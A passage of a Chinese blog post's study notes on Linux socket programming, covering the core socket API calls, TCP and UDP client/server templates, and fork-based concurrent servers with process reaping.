class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/* include some header files */</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int sockfd;</span><br><span class="line">if((sockfd=socket(AF_INET,SOCK_STREAM,0))=-1)</span><br><span class="line">&#123;</span><br><span class="line">perror(“Create socket failed.”);</span><br><span class="line">exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">/* connect to server */</span><br><span class="line">……</span><br><span class="line">/* send requst and receive response */</span><br><span class="line">……</span><br><span class="line">close(sockfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基本套接字函数"><a href="#基本套接字函数" class="headerlink" title="基本套接字函数"></a>基本套接字函数</h3><h4 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span></span><br><span class="line">返回：非负套接字（sockfd）－成功；-1－出错</span><br></pre></td></tr></table></figure><p><code>family</code>:协议族；type:套接字类型; <code>protocol</code>：如调用者不想指定，一般为0 ，表示缺省，原始套接字除外。<br><img src="/2018/11/20/Linux网络编程基础/1541588723624.png" alt="Alt text"><br><img src="/2018/11/20/Linux网络编程基础/1541502100557.png" alt="Alt text"><br><code>protocal</code>: 指明socket请求所使用的协议，<code>IPPROTO_TCP</code>表示TCP协议，<code>IPPROTO_UDP</code>表示UDP协议</p><blockquote><p>创建socket代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line">……</span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">   <span class="comment">//crteate socket</span></span><br><span class="line"><span class="keyword">if</span>((sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) = = <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//handle exception</span></span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, socklen_len len)</span></span></span><br><span class="line">                                 返回：0－成功；-1－出错并置errno</span><br></pre></td></tr></table></figure><p>该函数指明套接字将使用本地的哪一个协议的参数进行数据传送（IP地址和端口号）注意：协议地址<code>addr</code>是通用地址。<br><code>Len</code>是该地址结构（第二个参数）的长度。<br><img src="/2018/11/20/Linux网络编程基础/1541589366920.png" alt="Alt text"></p><h4 id="setsockopt"><a href="#setsockopt" class="headerlink" title="setsockopt"></a>setsockopt</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socktet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setsockopt</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">const</span> <span class="keyword">void</span> *optval, <span class="keyword">socklen_t</span> optlen)</span></span>;</span><br><span class="line">                                  <span class="comment">//返回：0－OK；-1－出错。</span></span><br></pre></td></tr></table></figure><p><code>Level</code>是选项所在的层及协议，有如下值:</p><ul><li>SOL_SOCKET (通用套接字 )</li><li>IPPROTO_TCP(传输层，TCP协议)</li><li>IPPROTO_IP(网际层，IP协议)<br><code>optname</code>是操作选项名<br><code>optval</code>是一个指向变量的指针<h4 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span></span><br><span class="line">                    返回：0－成功；-1－出错并置errno值；</span><br></pre></td></tr></table></figure></li></ul><p>仅被服务器调用。函数listen将未连接的套接字转化成被动套接字，指示内核应接受指向此套接字的连接请求；函数的第二个参数规定了内核为此套接字排队的最大连接个数；<br><img src="/2018/11/20/Linux网络编程基础/1541590118862.png" alt="Alt text"><br><img src="/2018/11/20/Linux网络编程基础/1541590134105.png" alt="Alt text"></p><h4 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line">                                  <span class="comment">// 返回：0－成功；-1－出错；</span></span><br></pre></td></tr></table></figure><p>函数<code>connect</code>激发TCP的三次握手过程。<br>|错误代码|原因|<br>|:–:|:—:|<br>|ETIMEDOUT|客户没有收到SYN分节响应|<br>|ECONNREFUSED|SYN响应为RST|<br>|EHOSTUNREACH或ENETUNREACH|ICMP错误，地址不可达|</p><h4 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *cliaddr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line">             返回：非负描述字（connfd）－OK；<span class="number">-1</span>－出错；</span><br></pre></td></tr></table></figure><p>由TCP服务器调用，从已完成连接队列头返回下一个已完成连接。如果为空则进程进入睡眠状态。</p><h4 id="close"><a href="#close" class="headerlink" title="close"></a>close</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> sockfd)</span></span>;</span><br><span class="line">                  返回:<span class="number">0</span>－OK；<span class="number">-1</span>－出错；</span><br></pre></td></tr></table></figure><p>关闭套接字。<br>如果套接字描述符访问计数在调用close后大于0（在多个进程共享同一个套接字的情况下），则不会引发TCP终止序列（即不会发送FIN分节）；</p><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shutdown</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> howto)</span></span>;</span><br><span class="line">                  返回:<span class="number">0</span>－OK；<span class="number">-1</span>－出错，并置相应的errno的值；</span><br></pre></td></tr></table></figure><p>立即发送FIN分节。</p><h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line">返回:大于<span class="number">0</span>－读写字节大小；<span class="number">-1</span>－出错；</span><br></pre></td></tr></table></figure><p>接收缓冲区数据，返回接收到的字节数。<br>tcp协议收到FIN数据，返回0；<br>tcp协议收到RST数据，返回－1，同时errno为ECONNRESET；<br>进程阻塞过程中接收到信号，返回－1，同时errno为EINTR。</p><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line">                     返回:大于<span class="number">0</span>－读写字节大小；<span class="number">-1</span>－出错；</span><br></pre></td></tr></table></figure><p>向缓冲区发送数据，返回发送的字节数。<br>tcp协议接收到RST数据，返回－1，同时errno为ECONNRESET； ；<br>进程阻塞过程中接收到信号，返回－1，同时errno为EINTR。</p><h3 id="数据传输函数"><a href="#数据传输函数" class="headerlink" title="数据传输函数"></a>数据传输函数</h3><h4 id="send"><a href="#send" class="headerlink" title="send"></a>send</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> send (<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *msg, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags);</span><br><span class="line">       <span class="comment">//返回：非0－发送成功的数据长度；-1－出错；</span></span><br></pre></td></tr></table></figure><p><code>flags</code> 是传输控制标志，其值定义如下：</p><ul><li>0：常规操作，如同write()函数</li><li>MSG_OOB：发送带外数据(TCP紧急数据)。</li><li>MSG_DONTROUTE：忽略底层协议的路由设置，只能将数据发送给与发送机处在同一个网络中的机器上。<h4 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> recv(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf ,<span class="keyword">size_t</span> len, <span class="keyword">int</span> flags);</span><br><span class="line">             返回：大于<span class="number">0</span>表示成功接收的数据长度；<span class="number">0</span>: 对方已关闭，<span class="number">-1</span>:出错。</span><br></pre></td></tr></table></figure></li></ul><p><code>flags</code>是传输控制标志，其值定义如下：</p><ul><li>0：常规操作，如同read()函数；</li><li>MSG_PEEK：只查看数据而不读出数据，后续读操作仍然能读出所查看的该数据；</li><li>MSG_OOB：忽略常规数据，而只读带外数据；</li><li>MSG_WAITALL：recv函数只有在将接收缓冲区填满后才返回。<h3 id="域名解析函数——gethostbyname"><a href="#域名解析函数——gethostbyname" class="headerlink" title="域名解析函数——gethostbyname"></a>域名解析函数——gethostbyname</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="function">struct hostent *<span class="title">gethostbyname</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *hostname)</span></span>;</span><br><span class="line">              返回：非空指针－成功；空指针－出错，同时设置h_error</span><br></pre></td></tr></table></figure></li></ul><p>可解析IPv4和IPv6地址，既可接收域名也可接收点分十进制。<br>当<code>hostname</code>为点分十进制时，函数不执行网络查询直接拷贝到结果。<br><img src="/2018/11/20/Linux网络编程基础/1541593526946.png" alt="Alt text"></p><h3 id="读取文件函数"><a href="#读取文件函数" class="headerlink" title="读取文件函数"></a>读取文件函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">fgets</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> num, FILE *fp)</span></span>;</span><br></pre></td></tr></table></figure><p>从<code>fp</code>指向的文件读取一个长度为num-1的字符串，存入起始地址为<code>buf</code>的空间。返回地址<code>buf</code>，若遇文件结束或出错，返回NULL。<br>其中，<code>fp</code>使用<code>stdin</code>就是从标准输入读取数据 </p><h3 id="UDP套接字编程"><a href="#UDP套接字编程" class="headerlink" title="UDP套接字编程"></a>UDP套接字编程</h3><p><img src="/2018/11/20/Linux网络编程基础/1541906638836.png" alt="Alt text"></p><h4 id="服务器端-1"><a href="#服务器端-1" class="headerlink" title="服务器端"></a>服务器端</h4><ol><li>建立UDP套接字；</li><li>绑定套接字到特定地址；</li><li>等待并接收客户端信息；</li><li>处理客户端请求；</li><li>发送信息回客户端；</li><li>关闭套接字；<h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4></li><li>建立UDP套接字；</li><li>发送信息给服务器；</li><li>接收来自服务器的信息；</li><li>关闭套接字<h4 id="服务器端模板"><a href="#服务器端模板" class="headerlink" title="服务器端模板"></a>服务器端模板</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#inlcude <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> socketfd;</span><br><span class="line"><span class="keyword">if</span> ((sockfd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(“Create socket failed.”);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Bind socket to address */</span></span><br><span class="line">     ……</span><br><span class="line">     loop  &#123;</span><br><span class="line"><span class="comment">/* receive and process data from client */</span></span><br><span class="line">             ……</span><br><span class="line">             <span class="comment">/* send resuts to client */</span></span><br><span class="line">&#125;</span><br><span class="line">close(sockfd);      &#125;</span><br><span class="line">![Alt text](./<span class="number">1541906670794.</span>png)</span><br></pre></td></tr></table></figure></li></ol><h4 id="客户端模板"><a href="#客户端模板" class="headerlink" title="客户端模板"></a>客户端模板</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#inlcude <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sockfd;</span><br><span class="line"><span class="keyword">if</span> ((sockfd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(“Create socket failed.”);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* send data to the server */</span></span><br><span class="line">……</span><br><span class="line"><span class="comment">/* receive data from the server */</span></span><br><span class="line">……</span><br><span class="line">close(sockfd);</span><br><span class="line">&#125;</span><br><span class="line">![Alt text](./<span class="number">1541906705051.</span>png)</span><br></pre></td></tr></table></figure><h3 id="UDP数据传输函数"><a href="#UDP数据传输函数" class="headerlink" title="UDP数据传输函数"></a>UDP数据传输函数</h3><h4 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> sendto(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *msg, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, <span class="keyword">const</span> struct sockaddr *to, <span class="keyword">int</span> tolen);</span><br><span class="line">返回：大于<span class="number">0</span>－成功发送数据长度；<span class="number">-1</span>－出错；</span><br></pre></td></tr></table></figure><p>UDP是无连接协议，必须使用<code>sendto</code>函数。指明目的地址。<br>flags是传输控制标志，其值定义如下：<br>    <code>0</code>：常规操作，如同write()函数；<br>    <code>MSG_OOB</code>：发送带外数据；<br>    <code>MSG_DONTROUTE</code>：忽略底层路由协议，直接发送。</p><h4 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> recvfrom(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, struct sockaddr *from, <span class="keyword">int</span> *fromlen);</span><br><span class="line">          返回：大于<span class="number">0</span>－成功接收数据长度；<span class="number">-1</span>－出错；</span><br></pre></td></tr></table></figure><p>指明源地址。flags是传输控制标志，其值定义如下：<br>    <code>0</code>：常规操作，如同read()函数；<br>    <code>MSG_PEEK</code>：只察看数据而不读出数据；<br>    <code>MSG_OOB</code>：忽略常规数据，而只读取带外数据；</p><h3 id="注意复习实验内容和作业内容"><a href="#注意复习实验内容和作业内容" class="headerlink" title="注意复习实验内容和作业内容"></a>注意复习实验内容和作业内容</h3><h2 id="多线程多进程并发服务器"><a href="#多线程多进程并发服务器" class="headerlink" title="多线程多进程并发服务器"></a>多线程多进程并发服务器</h2><p>Linux系统支持并发三种方式：<strong>进程，线程， I/O多路复用</strong></p><p>按连接类型分为面向连接和无连接的服务器<br>按处理方式分为迭代和并发服务器<br><img src="/2018/11/20/Linux网络编程基础/1542174508597.png" alt="Alt text"></p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>进程是一个动态实体，是独立的任务，拥有独立的地址空间、执行堆栈、文件描述符。进程是相互独立的，互不影响。可以通过IPC机制相互通信。</p><h4 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h4><h5 id="创建新进程"><a href="#创建新进程" class="headerlink" title="创建新进程"></a>创建新进程</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);</span><br><span class="line"><span class="comment">//返回：父进程中返回子进程的进程ID, 子进程返回0，返回-1－出错</span></span><br><span class="line"><span class="keyword">pid_t</span> vfork(<span class="keyword">void</span>);<span class="comment">//父进程将被暂时阻塞</span></span><br></pre></td></tr></table></figure><h5 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h5><p>进程的终止存在两个可能：</p><ul><li>父进程先于子进程终止（init进程领养）</li><li>子进程先于主进程终止</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span></span><br><span class="line"><span class="function"><span class="comment">//关闭所有子进程打开的描述符，向父进程发送SIGCHLD信号，并返回状态</span></span></span><br></pre></td></tr></table></figure><h5 id="获取子进程终止信息"><a href="#获取子进程终止信息" class="headerlink" title="获取子进程终止信息"></a>获取子进程终止信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line">pid_t wait(int *stat_loc);</span><br><span class="line">//返回：终止子进程的ID－成功；-1－出错；stat_loc存储子进程的终止状态（一个整数）；</span><br></pre></td></tr></table></figure><p>如果没有终止的子进程，但是有一个或多个正在执行的子进程，则该函数将堵塞，直到有一个子进程终止或者wait被信号中断时，wait返回。<br>当调用该系统调用时，如果有一个子进程已经终止，则该系统调用立即返回，并释放子进程所有资源。<br>使用wait可能会留下僵尸进程<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *stat_loc, <span class="keyword">int</span> options);</span><br><span class="line">         <span class="comment">//返回：终止子进程的ID－成功；-1－出错；stat_loc存储子进程的终止状态；</span></span><br></pre></td></tr></table></figure></p><p><code>pid</code>：</p><ul><li>-1：要求知道任何一个子进程的返回状态（等待第一个终止的子进程）；</li><li>>0：要求知道进程号为pid的子进程的状态；</li><li>&lt;-1:要求知道进程号为pid的绝对值的子进程的终止状态 </li></ul><p><code>options</code>：最常用的选项是WNOHANG,它通知内核在没有已终止进程时不要堵塞。</p><p>调用wait或waitpid函数时，正常情况下，可能会有以下几种情况：</p><ul><li>阻塞（如果其所有子进程都还在运行）；</li><li>获得子进程的终止状态并立即返回（如果一个子进程已终止，正等待父进程存取其终止状态）；</li><li>出错立即返回（如果它没有任何子进程）<h4 id="多进程并发服务器模板"><a href="#多进程并发服务器模板" class="headerlink" title="多进程并发服务器模板"></a>多进程并发服务器模板</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> listenfd, connfd;</span><br><span class="line"><span class="keyword">pid_t</span>   pid;</span><br><span class="line"><span class="keyword">int</span>BACKLOG = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">if</span> ((listenfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>)  &#123;</span><br><span class="line">perror(“Create socket failed.”);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">    bind(listenfd, …);</span><br><span class="line">listen(listenfd, BACKLOG);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((connfd = accept(sockfd, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) == <span class="number">-1</span>)  &#123;</span><br><span class="line">perror(“Accept error.”);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>((pid = fork() ) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="comment">/*parent process */</span></span><br><span class="line">         close(connfd);</span><br><span class="line">          …….</span><br><span class="line">         <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/*child process */</span></span><br><span class="line">        close(lisetenfd);</span><br><span class="line">       …….</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="built_in">printf</span>(“fork error\n”);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="父子进程对套接字处理"><a href="#父子进程对套接字处理" class="headerlink" title="父子进程对套接字处理"></a>父子进程对套接字处理</h4><p>产生新的子进程后，父进程要关闭<strong>连接套接字</strong>，子进程要关闭<strong>监听套接字</strong>。<br><strong>原因</strong>：</p><ol><li>节省系统资源。</li><li>避免父子进程同时对共享描述符进程操作造成错误。</li><li>为了正确关闭连接，需要父进程将不需要的已连接描述符关闭，子进程关闭不需要的监听描述符，使访问计数符在关闭时能置为0。</li></ol><h4 id="僵尸进程与孤儿进程"><a href="#僵尸进程与孤儿进程" class="headerlink" title="僵尸进程与孤儿进程"></a>僵尸进程与孤儿进程</h4><p>参考文章：<a href="https://www.cnblogs.com/Anker/p/3271773.html" target="_blank" rel="external">https://www.cnblogs.com/Anker/p/3271773.html</a></p><h5 id="僵尸进程"><a href="#僵尸进程" class="headerlink" 